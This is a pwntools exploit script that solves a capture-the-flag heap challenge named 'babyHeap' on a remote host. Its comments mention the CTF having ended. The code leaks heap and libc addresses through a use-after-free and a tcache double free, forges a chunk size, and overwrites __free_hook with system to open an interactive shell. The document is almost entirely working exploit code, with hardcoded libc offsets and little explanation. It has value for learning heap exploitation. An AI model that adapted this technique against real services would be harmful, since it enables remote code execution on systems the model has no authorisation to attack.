from pwn import *

#r = process("./babyHeap")
#gdb.attach(r)

r = remote("34.125.0.41", 8888)

r.recvuntil(b'>')

def create(index, size, data):
	r.sendline(b'1')
	r.recvuntil(b'Idx:')
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'Size:')
	r.sendline(str(size).encode("utf-8"))
	r.recvuntil(b'Data:')
	r.send(data)
	r.recvuntil(b">")

def edit(index, data):
	r.sendline(b'2')
	r.recvuntil(b'Idx:')
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'Data:')
	r.send(data)
	r.recvuntil(b'>')

def delete(index):
	r.sendline(b'3')
	r.recvuntil(b'Idx:')
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'>')

def show(index):
	r.sendline(b'4')
	r.recvuntil(b'Idx:')
	r.sendline(str(index).encode("utf-8"))
	return r.recvuntil(b'>')

# leak heap and overwrite chunk
create(0, 0x20, b"abcd")
delete(0)
stuff = show(0).split(b'--------------------------------------')[0].split(b'\n')[2][8:8+6]
heap_base = int.from_bytes(stuff, "little") - 0x10
print("heap base: " + hex(heap_base))

# overwrite free_hook
create(1, 0x30, "free_hook")

# get shell via free_hook
create(2, 0x40, b"/bin/sh\x00")


# make big chunk1
create(3, 0x250, "use_me")

# make big chunk2
create(4, 0x250, "padding")

# prevent consolidate with top wild chunk
create(5, 0x10, "dontcare")

chunk0 = heap_base + 0x290
chunk1 = chunk0 + 0x30
chunk2 = chunk1 + 0x40
chunk3 = chunk2 + 0x50
chunk4 = chunk3 + 0x260
chunk5 = chunk4 + 0x260


# make double free
payload = p64(0) + p64(0x1337)
edit(0, payload)

# double free
delete(0)


# pre create
payload = p64(chunk3) + p64(0)
edit(0, payload)
create(0, 0x20, "\n")


# overwrite chunk3.size
payload = p64(0) + p64(0x4c1)
create(11, 0x20, payload)



delete(3)
stuff = show(3).split(b'\x7f')[0][-5:] + b"\x7f"
libc_base = int.from_bytes(stuff, "little") - (0x00000000001ebb70 + 0x10 + 96)
print("libc_base: " + hex(libc_base))

free_hook = libc_base + 0x00000000001eeb28
system = libc_base + 0x0000000000055410



# ---------------
# overwrite free_hook part
delete(1)

payload = p64(0) + p64(0x1337)
edit(1, payload)

delete(1)

payload = p64(free_hook)
edit(1, payload)

create(12, 0x30, "\n")

payload = p64(system)
create(13, 0x30, payload)

#delete(2)
r.sendline(b'3')
r.recvuntil(b'Idx:')
r.sendline(b'2')


r.interactive()

# after ctf ending
# the way I leak libc is too long, there is another way faster, malloc 8 times and free 8 times :xD